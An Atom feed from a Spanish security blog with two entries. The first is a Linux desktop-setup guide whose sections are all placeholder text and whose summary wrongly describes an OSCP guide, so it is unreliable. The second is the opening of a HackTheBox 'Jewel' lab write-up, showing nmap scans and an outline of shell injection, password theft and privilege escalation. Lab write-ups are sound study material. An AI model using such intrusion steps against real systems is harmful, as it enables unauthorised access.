<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-11-24T17:32:14+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">jflabur.io</title><subtitle>Artículos sobre ciberseguridad, CTFs e investigaciones</subtitle><author><name>Jflabur</name><email>s4vipriv@gmail.com</email></author><entry><title type="html">Cómo configurar un buen entorno de trabajo en Linux</title><link href="http://localhost:4000/como-configurar-un-buen-entorno-de-trabajo-en-linux/" rel="alternate" type="text/html" title="Cómo configurar un buen entorno de trabajo en Linux" /><published>2020-09-26T01:00:00+02:00</published><updated>2020-09-26T01:00:00+02:00</updated><id>http://localhost:4000/como-configurar-un-buen-entorno-de-trabajo-en-linux</id><content type="html" xml:base="http://localhost:4000/como-configurar-un-buen-entorno-de-trabajo-en-linux/">&lt;p&gt;Muy buenas a todos soy jflabur y en esta ocasión os traigo un artículo un poco diferente, por lo menos en  cuanto a temática, no vamos a estar tocando open testing no todo es romper…&lt;/p&gt;

&lt;p&gt;Cómo hago para que mi entorno de escritorio se vea tal y como se ve es decir yo no tengo escritorio todo  está vacío, yo no puedo hacer clic derecho ni puedo crear una carpeta desde directamente no puedo hacer clic derecho y darle a crear nueva carpeta todo lo tengo que hacer por consola yo lo que utilizo es Bspwm que es un gestor de ventanas más personalizabley mucho más avanzado que ib3 gaps sobre todo por el nivel de personalización.&lt;/p&gt;

&lt;p&gt;Yo no utilizo una bash  sino una zsh pero fusionada con Powerlevel 10k que me permite personalizar
mucho más a fondo, y todo esto se personaliza a mano o sea que tiene su trabajo no os creáis que es simple pero al final tiene su recompensa&lt;/p&gt;
&lt;h2 id=&quot;índice-y-estructura-principal&quot;&gt;Índice y Estructura Principal&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;#introduccion&quot;&gt;Introduccion&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#instalando-bspwm&quot;&gt;Instalando bspwm&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#instalando-dependencias-de-bspwm&quot;&gt;Instalando dependencias de bspwm&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#instalando-sxhkd&quot;&gt;Instalando sxhkd&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#fijando-archivos-de-configuracion-para-los-servicios-sxhkd-y-bspwm&quot;&gt;Fijando archivos de configuracion para los servicios sxhkd y bspwm&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#configurando-archivo-xinitrc&quot;&gt;Configurando archivo ~/.xinitrc&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#instalando-compton&quot;&gt;Instalando compton&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#creando-configuracion-para-el-manejo-sobre-aplicaciones-java&quot;&gt;Creando configuracion para el manejo sobre aplicaciones Java&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#instalando-feh&quot;&gt;Instalando feh&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#configurando-el-prefix-a-mod1-tecla-windows&quot;&gt;Configurando el prefix a mod1 (Tecla Windows)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#configurando-fichero-sxhkdrc&quot;&gt;Configurando fichero sxhkdrc&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#instalando-rofi&quot;&gt;Instalando Rofi&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#configurando-utilidad-de-resize-para-el-sxhkd-creando-script-personalizado&quot;&gt;Configurando utilidad de resize para el sxhkd (Creando script personalizado)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#entrando-a-bspwm-con-la-configuracion-establecida&quot;&gt;Entrando a bspwm con la configuracion establecida&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#sincronizando-compton-con-bspwm&quot;&gt;Sincronizando compton con bspwm&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#creando-fichero-de-configuracion-para-compton&quot;&gt;Creando fichero de configuracion para compton&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#ajustando-transparencia-para-algunos-servicios&quot;&gt;Ajustando transparencia para algunos servicios&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#configurando-floating-window-para-el-servicio-deseado&quot;&gt;Configurando floating window para el servicio deseado&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#configurando-fondo-de-escritorio&quot;&gt;Configurando fondo de escritorio&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#creando-efecto-blur-al-fondo-con-compton&quot;&gt;Creando efecto blur al fondo con compton&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#configurando-polybar&quot;&gt;Configurando Polybar&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#creando-launcher-en-bash-para-polybar&quot;&gt;Creando launcher en Bash para Polybar&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#sincronizando-polybar-con-bspwm&quot;&gt;Sincronizando Polybar con Bspwm&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#reinstalando-polybar-con-la-version-340-la-otra-da-problemas&quot;&gt;Reinstalando Polybar con la version 3.4.0 (La otra da problemas)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#instalando-fuente-de-hacker-nerd-fonts&quot;&gt;Instalando fuente de Hacker Nerd Fonts&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#lanzando-polybar&quot;&gt;Lanzando Polybar&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#configurando-fuente&quot;&gt;Configurando fuente&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#configurando-la-polybar&quot;&gt;Configurando la Polybar&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#sincronizando-fuente-hacker-nerd-fonts-en-la-polybar&quot;&gt;Sincronizando fuente Hacker Nerd Fonts en la Polybar&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#creando-nuestros-propios-modulos-para-la-polybar&quot;&gt;Creando nuestros propios modulos para la Polybar&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#configurando-utilidad-de-hackthebox-en-la-polybar&quot;&gt;Configurando utilidad de HackTheBox en la Polybar&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#probando-configuracion-de-la-polybar&quot;&gt;Probando configuracion de la Polybar&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#configurando-transparencia-de-la-polybar&quot;&gt;Configurando transparencia de la Polybar&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#instalando-powerlevel10k-y-configurando-consola-zsh&quot;&gt;Instalando Powerlevel10k y configurando consola ZSH&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#personalizando-la-powerlevel10k&quot;&gt;Personalizando la Powerlevel10k&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#configurando-nuestros-propios-iconos-en-la-powerlevel10k&quot;&gt;Configurando nuestros propios iconos en la Powerlevel10k&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#cambiando-el-tipo-de-terminal-para-los-usuarios-existentes-a-nivel-de-sistema&quot;&gt;Cambiando el tipo de terminal para los usuarios existentes a nivel de sistema&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#creando-enlace-simbolico-para-el-fichero-zshrc-del-usuario-root&quot;&gt;Creando enlace simbolico para el fichero .zshrc del usuario root&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#configurando-el-fichero-zshrc&quot;&gt;Configurando el fichero .zshrc&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#instalando-lsd-ls-con-esteroides&quot;&gt;Instalando lsd (ls con esteroides)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#centralizando-en-el-zshrc-aliases-para-lsd&quot;&gt;Centralizando en el .zshrc aliases para lsd&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#configurando-utilidad-bat-cat-con-esteroides&quot;&gt;Configurando utilidad ‘bat’ (cat con esteroides)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#configurando-man&quot;&gt;Configurando man&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#instalando-fzf-para-zsh&quot;&gt;Instalando fzf para zsh&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#creando-funcion-personalizada-para-fzf-en-zsh&quot;&gt;Creando funcion personalizada para fzf en zsh&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#instalando-plugins-en-zsh&quot;&gt;Instalando Plugins en ZSH&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#instalando-i3lock-fancy-y-imagemagick-para-el-bloqueo-de-pantalla&quot;&gt;Instalando i3lock-fancy y imagemagick para el bloqueo de pantalla&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#lanzar-proceso-con-sxhkd-bajo-un-contexto-privilegiado&quot;&gt;Lanzar proceso con sxhkd bajo un contexto privilegiado&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;introduccion&quot;&gt;Introduccion&lt;/h1&gt;
&lt;p&gt;Antes que nada, me gustaría comentar una serie de puntos para aquellos que pretenden seguir esta guía.&lt;/p&gt;
&lt;h2 id=&quot;instalando-bspwm&quot;&gt;Instalando bspwm&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;instalando-dependencias-de-bspwm&quot;&gt;Instalando dependencias de bspwm&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346F1.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;instalando-sxhkd&quot;&gt;Instalando sxhkd&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;fijando-archivos-de-configuracion-para-los-servicios-sxhkd-y-bspwm&quot;&gt;Fijando archivos de configuracion para los servicios sxhkd y bspwm&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;configurando-archivo-xinitrc&quot;&gt;Configurando archivo ~/.xinitrc&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;instalando-compton&quot;&gt;Instalando compton&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;creando-configuracion-para-el-manejo-sobre-aplicaciones-java&quot;&gt;Creando configuracion para el manejo sobre aplicaciones Java&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;instalando-feh&quot;&gt;Instalando feh&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;configurando-el-prefix-a-mod1-tecla-windows&quot;&gt;Configurando el prefix a mod1 (Tecla Windows)&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;configurando-fichero-sxhkdrc&quot;&gt;Configurando fichero sxhkdrc&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;instalando-rofi&quot;&gt;Instalando Rofi&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;configurando-utilidad-de-resize-para-el-sxhkd-creando-script-personalizado&quot;&gt;Configurando utilidad de resize para el sxhkd (Creando script personalizado)&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;entrando-a-bspwm-con-la-configuracion-establecida&quot;&gt;Entrando a bspwm con la configuracion establecida&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;sincronizando-compton-con-bspwm&quot;&gt;Sincronizando compton con bspwm&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;creando-fichero-de-configuracion-para-compton&quot;&gt;Creando fichero de configuracion para compton&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;ajustando-transparencia-para-algunos-servicios&quot;&gt;Ajustando transparencia para algunos servicios&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;configurando-floating-window-para-el-servicio-deseado&quot;&gt;Configurando floating window para el servicio deseado&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;configurando-fondo-de-escritorio&quot;&gt;Configurando fondo de escritorio&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;creando-efecto-blur-al-fondo-con-compton&quot;&gt;Creando efecto blur al fondo con compton&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;configurando-polybar&quot;&gt;Configurando Polybar&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;creando-launcher-en-bash-para-polybar&quot;&gt;Creando launcher en Bash para Polybar&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;sincronizando-polybar-con-bspwm&quot;&gt;Sincronizando Polybar con Bspwm&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;reinstalando-polybar-con-la-version-340-la-otra-da-problemas&quot;&gt;Reinstalando Polybar con la version 3.4.0 (La otra da problemas)&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;instalando-fuente-de-hacker-nerd-fonts&quot;&gt;Instalando fuente de Hacker Nerd Fonts&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;lanzando-polybar&quot;&gt;Lanzando Polybar&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;configurando-fuente&quot;&gt;Configurando fuente&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;configurando-la-polybar&quot;&gt;Configurando la Polybar&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;sincronizando-fuente-hacker-nerd-fonts-en-la-polybar&quot;&gt;Sincronizando fuente Hacker Nerd Fonts en la Polybar&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;creando-nuestros-propios-modulos-para-la-polybar&quot;&gt;Creando nuestros propios modulos para la Polybar&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;configurando-utilidad-de-hackthebox-en-la-polybar&quot;&gt;Configurando utilidad de HackTheBox en la Polybar&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;probando-configuracion-de-la-polybar&quot;&gt;Probando configuracion de la Polybar&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;configurando-transparencia-de-la-polybar&quot;&gt;Configurando transparencia de la Polybar&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;instalando-powerlevel10k-y-configurando-consola-zsh&quot;&gt;Instalando Powerlevel10k y configurando consola ZSH&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;personalizando-la-powerlevel10k&quot;&gt;Personalizando la Powerlevel10k&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;configurando-nuestros-propios-iconos-en-la-powerlevel10k&quot;&gt;Configurando nuestros propios iconos en la Powerlevel10k&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;cambiando-el-tipo-de-terminal-para-los-usuarios-existentes-a-nivel-de-sistema&quot;&gt;Cambiando el tipo de terminal para los usuarios existentes a nivel de sistema&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;creando-enlace-simbolico-para-el-fichero-zshrc-del-usuario-root&quot;&gt;Creando enlace simbolico para el fichero .zshrc del usuario root&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;configurando-el-fichero-zshrc&quot;&gt;Configurando el fichero .zshrc&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;instalando-lsd-ls-con-esteroides&quot;&gt;Instalando lsd (ls con esteroides)&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;centralizando-en-el-zshrc-aliases-para-lsd&quot;&gt;Centralizando en el .zshrc aliases para lsd&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;configurando-utilidad-bat-cat-con-esteroides&quot;&gt;Configurando utilidad ‘bat’ (cat con esteroides)&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;configurando-man&quot;&gt;Configurando man&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;instalando-fzf-para-zsh&quot;&gt;Instalando fzf para zsh&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;creando-funcion-personalizada-para-fzf-en-zsh&quot;&gt;Creando funcion personalizada para fzf en zsh&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;instalando-plugins-en-zsh&quot;&gt;Instalando Plugins en ZSH&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;instalando-i3lock-fancy-y-imagemagick-para-el-bloqueo-de-pantalla&quot;&gt;Instalando i3lock-fancy y imagemagick para el bloqueo de pantalla&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;lanzar-proceso-con-sxhkd-bajo-un-contexto-privilegiado&quot;&gt;Lanzar proceso con sxhkd bajo un contexto privilegiado&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;

&lt;p&gt;¡Un saludo y que os sea leve!&lt;/p&gt;</content><author><name>Jflabur</name><email>s4vipriv@gmail.com</email></author><category term="Certificaciones" /><category term="OSCP" /><category term="Offensive Security" /><category term="Pentesting" /><category term="Examen" /><category term="Guías" /><summary type="html">Para aquellos interesados en certificarse de OSCP, por aquí os dejo una guía hecha por mi donde de manera desglosada comentamos cada uno de los puntos importantes a tener en cuenta de cara a la examinación.</summary></entry><entry><title type="html">HackTheBox Jewel</title><link href="http://localhost:4000/hackthebox-jewel/" rel="alternate" type="text/html" title="HackTheBox Jewel" /><published>2020-09-16T00:00:00+02:00</published><updated>2020-09-16T00:00:00+02:00</updated><id>http://localhost:4000/hackthebox-jewel</id><content type="html" xml:base="http://localhost:4000/hackthebox-jewel/">&lt;div style=&quot;float: left; margin-left: 45px; margin-right: 35px;margin-top: 35px;&quot;&gt;
	&lt;table&gt;
                                &lt;thead&gt;
                                   &lt;tr&gt;
                                        &lt;th&gt;Column  &lt;/th&gt;&lt;th&gt;
                                            Detalles
                                &lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;
                                    &lt;tr&gt;
                                        &lt;td&gt;Name
                                        &lt;/td&gt;&lt;td&gt;
                                            Jewel
                                    &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;
                                        &lt;td&gt;IP
                                        &lt;/td&gt;&lt;td&gt;
                                            10.10.10.211
                                    &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;
                                        &lt;td&gt;Points
                                        &lt;/td&gt;&lt;td&gt;
                                            30
                                    &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;
                                        &lt;td&gt;Os
                                        &lt;/td&gt;&lt;td&gt;
                                            Linux
                                    &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;
                                        &lt;td&gt;Medium
                                        &lt;/td&gt;&lt;td&gt;
                                            Hard
                                    &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;
                                        &lt;td&gt;Creator
                                        &lt;/td&gt;&lt;td&gt;
                                            &lt;a href=&quot;https://www.hackthebox.eu/home/users/profile/159204&quot; target=&quot;_blank&quot;&gt;polarbearer&lt;/a&gt;
                                    &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;
                                        &lt;td&gt;Out On
                                        &lt;/td&gt;&lt;td&gt;10 Oct 2020
                            &lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
&lt;/table&gt;
	&lt;/div&gt;

&lt;div&gt;
	&lt;p align=&quot;left&quot;&gt;
&lt;img src=&quot;/assets/images/jewel/jewel.png&quot; /&gt;
&lt;/p&gt;
&lt;/div&gt;

&lt;h1 id=&quot;resumen&quot;&gt;Resumen&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;#nmap-muestra-los-3-puertos-abiertos&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Nmap&lt;/code&gt; muestra los 3 puertos abiertos.&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#conseguir-el-web-server&quot;&gt;Conseguir el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;web server&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#inyecctando-la-shell-en-el-servidor&quot;&gt;Inyecctando la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Shell&lt;/code&gt; en el servidor&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#conseguir-la-shell-desde-el-servidor&quot;&gt;Conseguir la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Shell&lt;/code&gt; desde el servidor&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#conseguir-el-password-de-la-cuenta-de-bill-en-los-backups-del-servidor&quot;&gt;Conseguir el password de la cuenta de bill en los &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;backups del servidor&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#obtener-el-codigo-de-google-authenticator&quot;&gt;Obtener el codigo de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Google Authenticator&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#usando-el-comando-sudo--l&quot;&gt;Usando el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#con-la-ayuda-de-gtfo-bins-obtenemos-el-roottxt&quot;&gt;Con la ayuda de GTFO bins obtenemos el root.txt&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;nmap-muestra-los-3-puertos-abiertos&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Nmap&lt;/code&gt; muestra los 3 puertos abiertos.&lt;/h2&gt;
&lt;p&gt;Primero añadinos a nuestro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; la máquina Jewel.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;10.10.10.211  jewel.htb&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /etc/hosts
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Cada uno tiene su forma de hacer la enumeración de puertos/servicios corriendo bajo un sistema. Yo generalmente suelo seguir estos pasos.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;scaneo inicial de puertos abiertos sobre el sistema&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-nmap&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 10.10.10.211
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/jewel/nmap1.png&quot; /&gt;
&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Enumeración del servicio y versionado para los puertos descubiertos sobre el sistema&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;allPorts | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oP&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'\d{2,5}/open'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{print $1}'&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;FS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/&quot;&lt;/span&gt; | xargs | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;','&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; 10.10.10.211 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;La razón de hacer esto es que me parece mucho más ágil el poder tener una visual de los puertos abiertos de un primer tirón para el escaneo inicial, así en lo que posteriormente lanzo el profundo de enumeración de servicios con los scripts básicos de enumeración, puedo ir enumerando por mi cuenta los puertos que corren servicios conocidos (HTTP, HTTPS, FTP, ms-sql-s, etc.).&lt;/p&gt;

